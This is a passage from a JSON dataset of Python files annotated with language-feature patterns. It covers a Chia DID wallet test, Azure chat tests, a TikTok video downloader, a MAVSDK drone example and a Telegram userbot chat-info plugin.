[bytes.fromhex(val[\"my_did\"])]\n        async with wallet_node_2.wallet_state_manager.lock:\n            did_wallet_2: DIDWallet = await DIDWallet.create_new_did_wallet(\n                wallet_node_2.wallet_state_manager, main_wallet_2, uint64(101), recovery_list\n            )\n        for i in range(0, num_blocks):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"\\0\"))\n        filename = \"test.backup\"\n        did_wallet_2.create_backup(filename)\n        val = await client.create_new_did_wallet_from_recovery(filename)\n        if \"success\" in val:\n            assert val[\"success\"]\n        assert val[\"type\"] == WalletType.DISTRIBUTED_ID.value\n        assert val[\"wallet_id\"] > 1\n        did_wallet_id_3 = val[\"wallet_id\"]\n        assert len(val[\"my_did\"]) == 64\n        assert bytes.fromhex(val[\"my_did\"]) == did_wallet_2.did_info.origin_coin.name()\n        assert bytes.fromhex(val[\"coin_name\"])\n        assert bytes.fromhex(val[\"newpuzhash\"])\n        assert bytes.fromhex(val[\"pubkey\"])\n        filename = \"test.attest\"\n        val = await client.did_create_attest(\n            did_wallet_2.wallet_id, val[\"coin_name\"], val[\"pubkey\"], val[\"newpuzhash\"], filename\n        )\n        if \"success\" in val:\n            assert val[\"success\"]\n        for i in range(0, num_blocks):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"\\0\"))\n        val = await client.did_recovery_spend(did_wallet_id_3, [filename])\n        if \"success\" in val:\n            assert val[\"success\"]\n        for i in range(0, num_blocks * 2):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(32 * b\"\\0\"))\n        val = await client.get_wallet_balance(did_wallet_id_3)\n        assert val[\"confirmed_wallet_balance\"] == 101\n        await rpc_server_cleanup()",
            "patterns": {
                "pep_526": [
                    [
                        77,
                        "did_wallet_2: DIDWallet = await DIDWallet.create_new_did_wallet("
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        21,
                        23,
                        "async generator",
                        "async def three_wallet_nodes(self):\n        async for _ in setup_simulators_and_wallets(1, 3, {}):\n            yield _"
                    ],
                    [
                        22,
                        23,
                        "async for",
                        "async for _ in setup_simulators_and_wallets(1, 3, {}):\n            yield _"
                    ]
                ]
            }
        },
        "136": {
            "file": "import pytest\nimport asyncio\nimport os\nfrom datetime import datetime\nfrom msrest.serialization import TZ_UTC\nfrom azure.communication.identity import CommunicationIdentityClient\nfrom azure.communication.chat.aio import (\n    ChatClient,\n    CommunicationTokenCredential,\n    CommunicationTokenRefreshOptions\n)\nfrom azure.communication.chat import (\n    ChatThreadMember,\n    ChatMessagePriority\n)\nfrom azure.communication.identity._shared.utils import parse_connection_str\nfrom azure_devtools.scenario_tests import RecordingProcessor\nfrom helper import URIIdentityReplacer\nfrom chat_e2e_helper import ChatURIReplacer\nfrom _shared.asynctestcase import AsyncCommunicationTestCase\nfrom _shared.testcase import BodyReplacerProcessor, ResponseReplacerProcessor\nclass ChatThreadClientTestAsync(AsyncCommunicationTestCase):\n    def setUp(self):\n        super(ChatThreadClientTestAsync, self).setUp()\n        self.recording_processors.extend([\n            BodyReplacerProcessor(keys=[\"id\", \"token\", \"senderId\", \"chatMessageId\", \"nextLink\", \"members\", \"multipleStatus\", \"value\"]),\n            URIIdentityReplacer(),\n            ResponseReplacerProcessor(keys=[self._resource_name]),\n            ChatURIReplacer()])\n        endpoint, _ = parse_connection_str(self.connection_str)\n        self.endpoint = endpoint\n        self.identity_client = CommunicationIdentityClient.from_connection_string(self.connection_str)\n        self.user = self.identity_client.create_user()\n        token_response = self.identity_client.issue_token(self.user, scopes=[\"chat\"])\n        self.token = token_response.token\n        self.new_user = self.identity_client.create_user()\n        refresh_option = CommunicationTokenRefreshOptions(self.token)\n        self.chat_client = ChatClient(self.endpoint, CommunicationTokenCredential(refresh_option))\n    def tearDown(self):\n        super(ChatThreadClientTestAsync, self).tearDown()\n        if not self.is_playback():\n            self.identity_client.delete_user(self.user)\n            self.identity_client.delete_user(self.new_user)\n    async def _create_thread(self):\n        topic = \"test topic\"\n        share_history_time = datetime.utcnow()\n        share_history_time = share_history_time.replace(tzinfo=TZ_UTC)\n        members = [ChatThreadMember(\n            user=self.user,\n            display_name='name',\n            share_history_time=share_history_time\n        )]\n        self.chat_thread_client = await self.chat_client.create_chat_thread(topic, members)\n        self.thread_id = self.chat_thread_client.thread_id\n    async def _send_message(self):\n        priority = ChatMessagePriority.NORMAL\n        content = 'hello world'\n        sender_display_name = 'sender name'\n        create_message_result = await self.chat_thread_client.send_message(\n            content,\n            priority=priority,\n            sender_display_name=sender_display_name)\n        self.message_id = create_message_result.id\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_update_thread(self):\n        async with self.chat_client:\n            await self._create_thread()\n            topic = \"update topic\"\n            async with self.chat_thread_client:\n                await self.chat_thread_client.update_thread(topic=topic)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_send_message(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                priority = ChatMessagePriority.NORMAL\n                content = 'hello world'\n                sender_display_name = 'sender name'\n                create_message_result = await self.chat_thread_client.send_message(\n                    content,\n                    priority=priority,\n                    sender_display_name=sender_display_name)\n                self.assertTrue(create_message_result.id)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_get_message(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                message = await self.chat_thread_client.get_message(self.message_id)\n                assert message.id == self.message_id\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_list_messages(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                if self.is_live:\n                    await asyncio.sleep(2)\n                chat_messages = self.chat_thread_client.list_messages(results_per_page=1)\n                items = []\n                async for item in chat_messages:\n                    items.append(item)\n                assert len(items) > 0\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_update_message(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                content = \"updated message content\"\n                await self.chat_thread_client.update_message(self.message_id, content=content)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_delete_message(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                await self.chat_thread_client.delete_message(self.message_id)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_list_members(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                chat_thread_members = self.chat_thread_client.list_members()\n                items = []\n                async for item in chat_thread_members:\n                    items.append(item)\n                assert len(items) == 1\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_add_members(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                share_history_time = datetime.utcnow()\n                share_history_time = share_history_time.replace(tzinfo=TZ_UTC)\n                new_member = ChatThreadMember(\n                        user=self.new_user,\n                        display_name='name',\n                        share_history_time=share_history_time)\n                members = [new_member]\n                await self.chat_thread_client.add_members(members)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_remove_member(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                share_history_time = datetime.utcnow()\n                share_history_time = share_history_time.replace(tzinfo=TZ_UTC)\n                new_member = ChatThreadMember(\n                        user=self.new_user,\n                        display_name='name',\n                        share_history_time=share_history_time)\n                members = [new_member]\n                await self.chat_thread_client.add_members(members)\n                await self.chat_thread_client.remove_member(self.new_user)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_send_typing_notification(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self.chat_thread_client.send_typing_notification()\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        112,
                        113,
                        "async for",
                        "async for item in chat_messages:\n                    items.append(item)"
                    ],
                    [
                        146,
                        147,
                        "async for",
                        "async for item in chat_thread_members:\n                    items.append(item)"
                    ]
                ]
            }
        },
        "137": {
            "file": "import os\nimport sys\nimport enum\nimport random\nimport asyncio\nimport aiohttp\nimport aiofiles\nfrom api import TikTok\nfrom robots import getAllowedAgents\nfrom utils import download_chromedriver, has_chromedriver\nDOWNLOADS_BASE_DIR = './videos'\nMAX_CONCURRENT = 4\nclass Scrape(enum.Enum):\n    TRENDING = 0\n    USER = 1\n    MUSIC = 2\n    HASHTAG = 3\n    OTHERS = 4\n    NONE = -1\nasync def download_worker(name, queue, session) -> None:\n    while True:\n        job = await queue.get()\n        username, video_id, video_url = job\n        file_name = f'{DOWNLOADS_BASE_DIR}/{username}/{video_id}.mp4'\n        print(f'[ w-{name} | q-{queue.qsize():03d} ] Downloading -> {file_name}')\n        if not await download_video(session, file_name, *job):\n            print(f'[ w-{name} | q-{queue.qsize():03d} ] Download FAILED for {file_name}')\n        queue.task_done()\nasync def download_video(session, file_name, username, video_id, video_url) -> bool:\n    try:\n        response = await session.request(method='GET', url=video_url)\n        status_code = response.status\n        if status_code != 200:\n            raise Exception(f'Error {status_code}')\n        async with aiofiles.open(file_name, 'wb') as file:\n            async for data_chunk in response.content.iter_chunked(1024):\n                if data_chunk:\n                    await file.write(data_chunk)\n        status = True\n    except Exception as e:\n        print(f'Exception: {e}')\n        status = False\n    return status\nasync def scrape(mode, username: str=None, count: int=0, likes: int=0, views: int=0, shares: int=0, comments: int=0):\n    tt = TikTok(proxify=False)\n    if mode == Scrape.TRENDING:\n        username = 'trending'\n        if count < 0:\n            count = 30\n        try:\n            results = tt.getTrending(count)\n        except Exception as e:\n            print('Exception:', e)\n            return None\n    elif mode == Scrape.USER:\n        try:\n            details = tt.getUserDetails(username)\n        except Exception as e:\n            print('Exception:', e)\n            return None\n        userInfo = details['userInfo']\n        _id = userInfo['user']['id']\n        secUid = userInfo['user']['secUid']\n        stats = details['userInfo']['stats']\n        videos = stats['videoCount']\n        if count < 0:\n            count = videos\n        results = tt.getUserTikToks(_id, count)\n    elif mode == Scrape.MUSIC:\n        pass\n    elif mode == Scrape.HASHTAG:\n        pass\n    if likes:\n        results = list(filter(lambda x: x['stats']['diggCount'] >= likes, results))\n    if views:\n        results = list(filter(lambda x: x['stats']['playCount'] >= views, results))\n    if shares:\n        results = list(filter(lambda x: x['stats']['shareCount'] >= shares, results))\n    if comments:\n        results = list(filter(lambda x: x['stats']['commentCount'] >= comments, results))\n    path = f'{DOWNLOADS_BASE_DIR}/{username}'\n    if not os.path.exists(path):\n        print(f'Creating directory {path}')\n        os.makedirs(path)\n    del tt\n    try:\n        queue = asyncio.Queue(maxsize=1000)\n        for item in results:\n            video_id = item['id']\n            download_url = item['video']['downloadAddr']\n            print('Adding to queue:', video_id)\n            await queue.put((username, video_id, download_url))\n        headers = {\n            'User-Agent': random.choice(getAllowedAgents()),\n            'method': 'GET',\n            'accept-encoding': 'gzip, deflate, br',\n            'referrer': 'https://www.tiktok.com/trending',\n            'upgrade-insecure-requests': '1',\n        }\n        async with aiohttp.ClientSession(headers=headers) as session:\n            tasks = []\n            for worker in range(MAX_CONCURRENT):\n                task = asyncio.create_task(download_worker(worker, queue, session))\n                tasks.append(task)\n            print(f'\\nWaiting for tasks in queue[{queue.qsize()}] to be processed...\\n')\n            await queue.join()\n        print('\\nFinishing tasks...\\n')\n        for task in tasks:\n            task.cancel()\n        await asyncio.gather(*tasks, return_exceptions=True)\n    except Exception as e:\n        print('Exception', e)  \nif __name__ == '__main__':\n    assert sys.version_info >= (3, 6), 'Python 3.6+ required.'\n    if not has_chromedriver():\n        download_chromedriver()\n    mode = Scrape.TRENDING\n    username = None\n    count = 10\n    likes = 0\n    views = 0\n    shares = 0\n    comments = 0\n    print('-=[ TikTok Public Video Scraper ]=-\\n\\n' +\n            '0 - Scrape by Trending Videos\\n' +\n            '1 - Scrape by Username\\n' +\n            '2 - Scrape by Music [WIP]\\n' +\n            '3 - Scrape by Hashtag [WIP]\\n')\n    mode = Scrape(int(input('Enter choice [0-3]: ')))\n    if mode == Scrape.USER:\n        username = input('Enter username to scrape: ')\n    count = int(input('\\nHow many vidoes would you like to scrape [-1 for all possible]: '))\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(scrape(mode, username=username, count=count, likes=likes, views=views, shares=shares, comments=comments))",
            "patterns": {
                "pep_567": [
                    [
                        5,
                        5,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        36,
                        38,
                        "async for",
                        "async for data_chunk in response.content.iter_chunked(1024):\n                if data_chunk:\n                    await file.write(data_chunk)"
                    ]
                ],
                "pep_498": [
                    [
                        81,
                        "    path = f'{DOWNLOADS_BASE_DIR}/{username}'"
                    ],
                    [
                        24,
                        "        file_name = f'{DOWNLOADS_BASE_DIR}/{username}/{video_id}.mp4'"
                    ],
                    [
                        25,
                        "        print(f'[ w-{name} | q-{queue.qsize():03d} ] Downloading -> {file_name}')"
                    ],
                    [
                        83,
                        "        print(f'Creating directory {path}')"
                    ],
                    [
                        27,
                        "            print(f'[ w-{name} | q-{queue.qsize():03d} ] Download FAILED for {file_name}')"
                    ],
                    [
                        34,
                        "            raise Exception(f'Error {status_code}')"
                    ],
                    [
                        41,
                        "        print(f'Exception: {e}')"
                    ],
                    [
                        105,
                        "            print(f'\\nWaiting for tasks in queue[{queue.qsize()}] to be processed...\\n')"
                    ],
                    [
                        25,
                        "        print(f'[ w-{name} | q-{queue.qsize():03d} ] Downloading -> {file_name}')"
                    ],
                    [
                        27,
                        "            print(f'[ w-{name} | q-{queue.qsize():03d} ] Download FAILED for {file_name}')"
                    ]
                ]
            }
        },
        "138": {
            "file": "import asyncio\nfrom mavsdk import System\nfrom mavsdk import (OffboardError, VelocityBodyYawspeed)\nasync def run():\n    drone = System()\n    await drone.connect(system_address=\"udp://:14540\")\n    await drone.param.set_float_param(\"MIS_TAKEOFF_ALT\", 1.0)  \n    await drone.param.set_int_param(\"COM_TAKEOFF_ACT\", 0)  \n    await drone.param.set_int_param(\"COM_OBL_ACT\", 0)  \n    asyncio.ensure_future(print_altitude(drone))\n    print(\"-- Arming\")\n    await drone.action.arm()\n    print(\"-- Setting initial setpoint\")\n    await drone.offboard.set_velocity_body(VelocityBodyYawspeed(0.0, 0.0, 0.0, 0.0))\n    print(\"-- Starting offboard\")\n    try:\n        await drone.offboard.start()\n    except OffboardError as error:\n        print(f\"Starting offboard mode failed with error code: {error._result.result}\")\n        print(\"-- Disarming\")\n        await drone.action.disarm()\n        return\n    print(\"-- Turn clock-wise and climb\")\n    await drone.offboard.set_velocity_body(VelocityBodyYawspeed(0.0, 0.0, -1, 0.0))\n    await asyncio.sleep(5)\n    print(\"-- Turn clock-wise and climb\")\n    await drone.offboard.set_velocity_body(VelocityBodyYawspeed(0.0, 0.1, 0.0, 0.0))\n    await asyncio.sleep(5)\n    print(\"-- Wait for a bit\")\n    await drone.offboard.set_velocity_body(VelocityBodyYawspeed(0.0, -0.1, 0.0, 0.0))\n    await asyncio.sleep(5)\n    print(\"-- Wait for a bit\")\n    await drone.offboard.set_velocity_body(VelocityBodyYawspeed(0.0, 0.0, 0.0, 2.0))\n    await asyncio.sleep(20)\n    print(\"-- Stopping offboard\")\n    try:\n        await drone.offboard.stop()\n    except OffboardError as error:\n        print(f\"Stopping offboard mode failed with error code: {error._result.result}\")\n    print(\"-- Landing\")\n    await drone.action.land()\nasync def print_altitude(drone):\n    previous_altitude = None\n    async for position in drone.telemetry.position():\n        altitude = round(position.relative_altitude_m)\n        if altitude != previous_altitude:\n            previous_altitude = altitude\n            print(f\"Altitude: {altitude}\")\nif __name__ == \"__main__\":\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(run())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        44,
                        48,
                        "async for",
                        "async for position in drone.telemetry.position():\n        altitude = round(position.relative_altitude_m)\n        if altitude != previous_altitude:\n            previous_altitude = altitude\n            print(f\"Altitude: {altitude}\")"
                    ]
                ],
                "pep_498": [
                    [
                        19,
                        "        print(f\"Starting offboard mode failed with error code: {error._result.result}\")"
                    ],
                    [
                        39,
                        "        print(f\"Stopping offboard mode failed with error code: {error._result.result}\")"
                    ],
                    [
                        48,
                        "            print(f\"Altitude: {altitude}\")"
                    ]
                ]
            }
        },
        "139": {
            "file": "from asyncio import sleep\nfrom os import remove\nfrom telethon import events\nimport asyncio\nfrom telethon.errors import (ChannelInvalidError, ChannelPrivateError, ChannelPublicGroupNaError, InviteHashEmptyError, InviteHashExpiredError, InviteHashInvalidError)\nfrom emoji import emojize\nfrom telethon.tl.types import MessageActionChannelMigrateFrom, ChannelParticipantsAdmins, ChannelParticipantCreator\nfrom telethon.tl.functions.messages import GetHistoryRequest, CheckChatInviteRequest, GetFullChatRequest\nfrom telethon.events import ChatAction\nfrom datetime import datetime\nfrom math import sqrt\nfrom telethon.tl.functions.channels import GetFullChannelRequest, GetParticipantsRequest,LeaveChannelRequest\nfrom telethon.utils import get_input_location\nfrom telethon.errors.rpcerrorlist import (UserIdInvalidError,\n                                          MessageTooLongError)\nfrom telethon.errors import (BadRequestError, ChatAdminRequiredError,\n                             ImageProcessFailedError, PhotoCropSizeSmallError,\n                             UserAdminInvalidError)\nfrom userbot import CMD_HELP\nfrom userbot.utils import  errors_handler, admin_cmd\n@borg.on(admin_cmd(pattern=\"leave$\"))\nasync def leave(e):\n        await e.edit(\"`Legend is leaving this chat.....!Goodbye aren't forever..` \")\n        time.sleep(3)\n        if '-' in str(e.chat_id):\n            await bot(LeaveChannelRequest(e.chat_id))\n        else:\n            await e.edit('`Sar This is Not A Chat`')\n@borg.on(admin_cmd(pattern=\"chatinfo(?: |$)(.*)\", outgoing=True))\nasync def info(event):\n    await event.edit(\"`Analysing the chat...`\")\n    chat = await get_chatinfo(event)\n    caption = await fetch_info(chat, event)\n    try:\n        await event.edit(caption, parse_mode=\"html\")\n    except Exception as e:\n        print(\"Exception:\", e)\n        await event.edit(\"`An unexpected error has occurred.`\")\n    return\nasync def get_chatinfo(event):\n    chat = event.pattern_match.group(1)\n    chat_info = None\n    if chat:\n        try:\n            chat = int(chat)\n        except ValueError:\n            pass\n    if not chat:\n        if event.reply_to_msg_id:\n            replied_msg = await event.get_reply_message()\n            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:\n                chat = replied_msg.fwd_from.channel_id\n        else:\n            chat = event.chat_id\n    try:\n        chat_info = await event.client(GetFullChatRequest(chat))\n    except:\n        try:\n            chat_info = await event.client(GetFullChannelRequest(chat))\n        except ChannelInvalidError:\n            await event.reply(\"`Invalid channel/group`\")\n            return None\n        except ChannelPrivateError:\n            await event.reply(\"`This is a private channel/group or I am banned from there`\")\n            return None\n        except ChannelPublicGroupNaError:\n            await event.reply(\"`Channel or supergroup doesn't exist`\")\n            return None\n        except (TypeError, ValueError) as err:\n            await event.reply(str(err))\n            return None\n    return chat_info\nasync def fetch_info(chat, event):\n    chat_obj_info = await event.client.get_entity(chat.full_chat.id)\n    broadcast = chat_obj_info.broadcast if hasattr(chat_obj_info, \"broadcast\") else False\n    chat_type = \"Channel\" if broadcast else \"Group\"\n    chat_title = chat_obj_info.title\n    warn_emoji = emojize(\":warning:\")\n    try:\n        msg_info = await event.client(GetHistoryRequest(peer=chat_obj_info.id, offset_id=0, offset_date=datetime(2010, 1, 1), \n                                                        add_offset=-1, limit=1, max_id=0, min_id=0, hash=0))\n    except Exception as e:\n        msg_info = None\n        print(\"Exception:\", e)\n    first_msg_valid = True if msg_info and msg_info.messages and msg_info.messages[0].id == 1 else False\n    creator_valid = True if first_msg_valid and msg_info.users else False\n    creator_id = msg_info.users[0].id if creator_valid else None\n    creator_firstname = msg_info.users[0].first_name if creator_valid and msg_info.users[0].first_name is not None else \"Deleted Account\"\n    creator_username = msg_info.users[0].username if creator_valid and msg_info.users[0].username is not None else None\n    created = msg_info.messages[0].date if first_msg_valid else None\n    former_title = msg_info.messages[0].action.title if first_msg_valid and type(msg_info.messages[0].action) is MessageActionChannelMigrateFrom and msg_info.messages[0].action.title != chat_title else None\n    try:\n        dc_id, location = get_input_location(chat.full_chat.chat_photo)\n    except Exception as e:\n        dc_id = \"Unknown\"\n        location = str(e)\n    description = chat.full_chat.about\n    members = chat.full_chat.participants_count if hasattr(chat.full_chat, \"participants_count\") else chat_obj_info.participants_count\n    admins = chat.full_chat.admins_count if hasattr(chat.full_chat, \"admins_count\") else None\n    banned_users = chat.full_chat.kicked_count if hasattr(chat.full_chat, \"kicked_count\") else None\n    restrcited_users = chat.full_chat.banned_count if hasattr(chat.full_chat, \"banned_count\") else None\n    members_online = chat.full_chat.online_count if hasattr(chat.full_chat, \"online_count\") else 0\n    group_stickers = chat.full_chat.stickerset.title if hasattr(chat.full_chat, \"stickerset\") and chat.full_chat.stickerset else None\n    messages_viewable = msg_info.count if msg_info else None\n    messages_sent = chat.full_chat.read_inbox_max_id if hasattr(chat.full_chat, \"read_inbox_max_id\") else None\n    messages_sent_alt = chat.full_chat.read_outbox_max_id if hasattr(chat.full_chat, \"read_outbox_max_id\") else None\n    exp_count = chat.full_chat.pts if hasattr(chat.full_chat, \"pts\") else None\n    username = chat_obj_info.username if hasattr(chat_obj_info, \"username\") else None\n    bots_list = chat.full_chat.bot_info  \n    bots = 0\n    supergroup = \"<b>Yes</b>\" if hasattr(chat_obj_info, \"megagroup\") and chat_obj_info.megagroup else \"No\"\n    slowmode = \"<b>Yes</b>\" if hasattr(chat_obj_info, \"slowmode_enabled\") and chat_obj_info.slowmode_enabled else \"No\"\n    slowmode_time = chat.full_chat.slowmode_seconds if hasattr(chat_obj_info, \"slowmode_enabled\") and chat_obj_info.slowmode_enabled else None\n    restricted = \"<b>Yes</b>\" if hasattr(chat_obj_info, \"restricted\") and chat_obj_info.restricted else \"No\"\n    verified = \"<b>Yes</b>\" if hasattr(chat_obj_info, \"verified\") and chat_obj_info.verified else \"No\"\n    username = \"@{}\".format(username) if username else None\n    creator_username = \"@{}\".format(creator_username) if creator_username else None\n    if admins is None:\n        try:\n            participants_admins = await event.client(GetParticipantsRequest(channel=chat.full_chat.id, filter=ChannelParticipantsAdmins(),\n                                                                            offset=0, limit=0, hash=0))\n            admins = participants_admins.count if participants_admins else None\n        except Exception as e:\n            print(\"Exception:\", e)\n    if bots_list:\n        for bot in bots_list:\n            bots += 1\n    caption = \"<b>CHAT INFO:</b>\\n\"\n    caption += f\"ID: <code>{chat_obj_info.id}</code>\\n\"\n    if chat_title is not None:\n        caption += f\"{chat_type} name: {chat_title}\\n\"\n    if former_title is not None:  \n        caption += f\"Former name: {former_title}\\n\"\n    if username is not None:\n        caption += f\"{chat_type} type: Public\\n\"\n        caption += f\"Link: {username}\\n\"\n    else:\n        caption += f\"{chat_type} type: Private\\n\"\n    if creator_username is not None:\n        caption += f\"Creator: {creator_username}\\n\"\n    elif creator_valid:\n        caption += f\"Creator: <a href=\\\"tg://user?id={creator_id}\\\">{creator_firstname}</a>\\n\"\n    if created is not None:\n        caption += f\"Created: <code>{created.date().strftime('%b %d, %Y')} - {created.time()}</code>\\n\"\n    else:\n        caption += f\"Created: <code>{chat_obj_info.date.date().strftime('%b %d, %Y')} - {chat_obj_info.date.time()}</code> {warn_emoji}\\n\"\n    caption += f\"Data Centre ID: {dc_id}\\n\"\n    if exp_count is not None:\n        chat_level = int((1+sqrt(1+7*exp_count/14))/2)\n        caption += f\"{chat_type} level: <code>{chat_level}</code>\\n\"\n    if messages_viewable is not None:\n        caption += f\"Viewable messages: <code>{messages_viewable}</code>\\n\"\n    if messages_sent:\n        caption += f\"Messages sent: <code>{messages_sent}</code>\\n\"\n    elif messages_sent_alt:\n        caption += f\"Messages sent: <code>{messages_sent_alt}</code> {warn_emoji}\\n\"\n    if members is not None:\n        caption += f\"Members: <code>{members}</code>\\n\"\n    if admins is not None:\n        caption += f\"Administrators: <code>{admins}</code>\\n\"\n    if bots_list:\n        caption += f\"Bots: <code>{bots}</code>\\n\"\n    if members_online:\n        caption += f\"Currently online: <code>{members_online}</code>\\n\"\n    if restrcited_users is not None:\n        caption += f\"Restricted users: <code>{restrcited_users}</code>\\n\"\n    if banned_users is not None:\n        caption += f\"Banned users: <code>{banned_users}</code>\\n\"\n    if group_stickers is not None:\n        caption += f\"{chat_type} stickers: <a href=\\\"t.me/addstickers/{chat.full_chat.stickerset.short_name}\\\">{group_stickers}</a>\\n\"\n    caption += \"\\n\"\n    if not broadcast:\n        caption += f\"Slow mode: {slowmode}\"\n        if hasattr(chat_obj_info, \"slowmode_enabled\") and chat_obj_info.slowmode_enabled:\n            caption += f\", <code>{slowmode_time}s</code>\\n\\n\"\n        else:\n            caption += \"\\n\\n\"\n    if not broadcast:\n        caption += f\"Supergroup: {supergroup}\\n\\n\"\n    if hasattr(chat_obj_info, \"restricted\"):\n        caption += f\"Restricted: {restricted}\\n\"\n        if chat_obj_info.restricted:\n            caption += f\"> Platform: {chat_obj_info.restriction_reason[0].platform}\\n\"\n            caption += f\"> Reason: {chat_obj_info.restriction_reason[0].reason}\\n\"\n            caption += f\"> Text: {chat_obj_info.restriction_reason[0].text}\\n\\n\"\n        else:\n            caption += \"\\n\"\n    if hasattr(chat_obj_info, \"scam\") and chat_obj_info.scam:\n    \tcaption += \"Scam: <b>Yes</b>\\n\\n\"\n    if hasattr(chat_obj_info, \"verified\"):\n        caption += f\"Verified by Telegram: {verified}\\n\\n\"\n    if description:\n        caption += f\"Description: \\n<code>{description}</code>\\n\"\n    return caption\n@borg.on(admin_cmd(pattern=\"getadmin ?(.*)\"))\nasync def _(event):\n    if event.fwd_from:\n        return\n    mentions = \"**Admins in this Group**: \\n\"\n    reply_message = None\n    if event.reply_to_msg_id:\n         reply_message = await event.get_reply_message()\n    input_str = event.pattern_match.group(1)\n    to_write_chat = await event.get_input_chat()\n    chat = None\n    if not input_str:\n        chat = to_write_chat\n    else:\n        mentions_heading = \"Admins in {} Group: \\n\".format(input_str)\n        mentions = mentions_heading\n        try:\n            chat = await borg.get_entity(input_str)\n        except Exception as e:\n            await event.edit(str(e))\n            return None\n    try:\n        async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n            if not x.deleted:\n                if isinstance(x.participant, ChannelParticipantCreator):\n                    mentions += \"\\n \ud83d\udc51 [{}](tg://user?id={}) `{}`\".format(x.first_name, x.id, x.id)\n        mentions += \"\\n\"\n        async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n            if not x.deleted:\n                if isinstance(x.participant, ChannelParticipantAdmin):\n                    mentions += \"\\n \u269c\ufe0f [{}](tg://user?id={}) `{}`\".format(x.first_name, x.id, x.id)\n            else:\n                mentions += \"\\n `{}`\".format(x.id)\n    except Exception as e:\n        mentions += \" \" + str(e) + \"\\n\"\n    if reply_message:\n        await reply_message.reply(mentions)\n    else:\n        await event.reply(mentions)\n    await event.delete()\n@borg.on(admin_cmd(pattern=r\"users ?(.*)\", outgoing=True))\nasync def get_users(show):\n        if not show.is_group:\n            await show.edit(\"Are you sure this is a group?\")\n            return\n        info = await show.client.get_entity(show.chat_id)\n        title = info.title if info.title else \"this chat\"\n        mentions = 'Users in {}: \\n'.format(title)\n        try:\n            if not show.pattern_match.group(1):\n                async for user in show.client.iter_participants(show.chat_id):\n                    if not user.deleted:\n                        mentions += f\"\\n[{user.first_name}](tg://user?id={user.id}) `{user.id}`\"\n                    else:\n                        mentions += f\"\\nDeleted Account `{user.id}`\"\n            else:\n                searchq = show.pattern_match.group(1)\n                async for user in show.client.iter_participants(show.chat_id, search=f'{searchq}'):\n                    if not user.deleted:\n                        mentions += f\"\\n[{user.first_name}](tg://user?id={user.id}) `{user.id}`\"\n                    else:\n                        mentions += f\"\\nDeleted Account `{user.id}`\"\n        except ChatAdminRequiredError as err:\n            mentions += \" \" + str(err) + \"\\n\"\n        try:\n            await show.edit(mentions)\n        except MessageTooLongError:\n            await show.edit(\"Damn, this is a huge group. Uploading users lists as file.\")\n            file = open(\"userslist.txt\", \"w+\")\n            file.write(mentions)\n            file.close()\n            await show.client.send_file(\n                show.chat_id,\n                \"userslist.txt\",\n                caption='Users in {}'.format(title),\n                reply_to=show.id,\n            )\n            remove(\"userslist.txt\")  \nCMD_HELP.update({\n    \"chatinfo\":\n    \".chatinfo or .chatinfo <username of group>\\\n     \\nUsage: Shows you the total information of the required chat.\\\n     \\n\\n.getadmin\\\n     \\nUsage: Retrieves a list of admins in the chat.\\\n     \\n\\n.users or .users <name of member>\\\n     \\nUsage: Retrieves all (or queried) users in the chat.\"\n  